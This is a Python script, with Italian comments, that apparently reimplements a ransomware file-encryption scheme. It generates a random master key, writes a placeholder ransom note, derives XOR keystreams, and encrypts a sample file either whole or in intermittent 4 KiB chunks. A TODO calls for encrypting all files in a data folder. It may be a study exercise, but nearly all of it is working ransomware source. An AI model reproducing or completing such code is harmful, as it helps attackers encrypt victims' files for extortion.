import os

# Write the random bytes to a file
def create_masterkey():
    file_size = 10 * 1024 * 1024 # Set the file size (in bytes)
    with open('masterkey.bin', 'wb') as f:
        f.write(os.urandom(file_size))

def open_masterkey():
    with open('masterkey.bin','rb') as f:
        return f.read()

def create_ransomnote():
    note = "This is a ransom note."
    with open('ransom_note.txt','w') as f:
        f.write(note)

def take_keystream(mkey,offset,size):
    return mkey[offset:offset+size]

def NBS_size_calc(FS):
    T: int = 0
    NBS: int = None
    if(FS <= 0x1000): # < 4KiB
        T = 0
    elif(FS > 0x1000 and FS <= 0x20000): # < 128KiB
        T =  FS>>12
    elif(FS > 0x20000 and FS <= 0x100000): # < 1MiB
        T = ((FS>>12)*30)/100
    elif(FS > 0x100000 and FS <= 0xA00000): # < 10MiB
        T = ((FS>>12)*20)/100
    elif(FS > 0xA00000 and FS <= 0x6400000): # < 100MiB
        T = ((FS>>12)*10)/100
    elif(FS > 0x6400000 and FS <= 0x40000000): # < 1GiB
        T = ((FS>>12)*5)/100
    else: # > 1GiB
        T = ((FS>>12)*1)/100
    #----------------- calcoliamo NBS
    if (T == 1):
        NBS = 0
    else:
        NBS = (FS-(T<<12))/(T-1)
    print("NBS = ", NBS)
    return NBS       

def create_EKS(ks1,ks2):
    EKS = bytearray(0xFFFFF)
    for i in range(0,0xFFFFF):
        EKS[i] = ks1[i] ^ ks2[i%0x400]
    return EKS

def full_encrypting(file, ks1, ks2):
    file_stats = os.stat(file)
    encrypted_file = bytearray(file_stats.st_size)
    #• EKS[i]← Keystream1[i] L Keystream2[i%0x400] (i← 0,1,· · · ,0xFFFFF)
    EKS = create_EKS(ks1,ks2)

    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())
        
    for i in range(0,file_stats.st_size):
        encrypted_file[i] = fileinbytes[i] ^ EKS[i%0x100000]

    return encrypted_file

#def encrypt_chunk(f, file, EKS, start, end):
#    for i in range(start, end):
#        f[i] = file[i] ^ EKS[i%0x100000]
#    return f[i]
    

def chunk_encrypting(file, ks1, ks2, NBS):
    file_stats = os.stat(file)
    encrypted_file = [] #bytearray(file_stats.st_size)
    EKS = create_EKS(ks1,ks2)
    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())

    my_size = file_stats.st_size
    chunks = []
    flag_enc = True
    current = 0
    
    while my_size > 0:
        if (flag_enc):
            chunks.append([True, fileinbytes[int(current):int(current+0x1000)], current, current+0x1000])
            my_size -= int(0x1000)
            current += int(0x1000)
            flag_enc = not flag_enc
        else:
            chunks.append([False, fileinbytes[int(current):int(current+NBS)]])
            my_size -= int(NBS)
            current += int(NBS)
            flag_enc = not flag_enc

    print(len(chunks))

    if(len(chunks[-1][1]) > int(0x1000)):
        print("Last chunk > 0x1000")
        addition = chunks[-1][1][:0x1000]
        remainder = chunks[-1][1][0x1000:]
        chunks[-1][1] = remainder
        chunks[-2][1] = addition
    
    for c in chunks:
        if c[0]:
            #print(c)
            #encrypted_file.extend(list(map(use_chunk,file,c,EKS)))
            arr = []
            for i in range(c[2],c[3]):
                arr.append(fileinbytes[i]^EKS[i%0x100000])
            encrypted_file.extend(arr)
        else:
            encrypted_file.extend(list(c[1]))

    return encrypted_file




    #encrypt_block = True
    #current = 0
    #encrypt_block = 0x1000
    #while current < file_stats.st_size:
    #    if encrypt_block:
    #        encrypt_block = False
    #        encrypted_file += encrypt_chunk(encrypted_file, fileinbytes, EKS,
    #         current, current+encrypt_block)
    #        current = current + 0x1000
    #    else:
    #        encrypt_block = True
    #        encrypted_file += fileinbytes[current:current+NBS]
    #        current += NBS


    #return encrypted_file


#Fase 1: creazione della master key
create_masterkey()
#Fase 2: creazione del messaggio di riscatto
create_ransomnote()

#Fase 3: generazione keystream
R1 = int.from_bytes(os.urandom(8),"big")
R2 = int.from_bytes(os.urandom(8),"big")
keystream1 = bytearray(take_keystream(open_masterkey(), R1 % 0x900000, 1024*1024)) #Prendiamo un numero casuale di 8 byte, facciamo un'operazione di modulo con il valore 0x900000 e prendiamo da questo offset nella nostra masterkey una porzione di 1MiB.
keystream2 = bytearray(take_keystream(open_masterkey(), R2 % 0x9FFC00, 1024)) #stessa cosa di prima ma l'offset è diverso e prendiamo 1KiB

#encrypted_lorem = full_encrypting('./lorem.txt', keystream1, keystream2)
file = './data/lorem.txt'
print("file_size = ", os.stat(file).st_size)
encrypted_lorem = chunk_encrypting(file, keystream1, keystream2, NBS_size_calc(os.stat(file).st_size))
with open('lorem_encrypted_chunks.txt','wb') as f:
    f.write(bytearray(encrypted_lorem))

#TODO encrypt all files in ./data/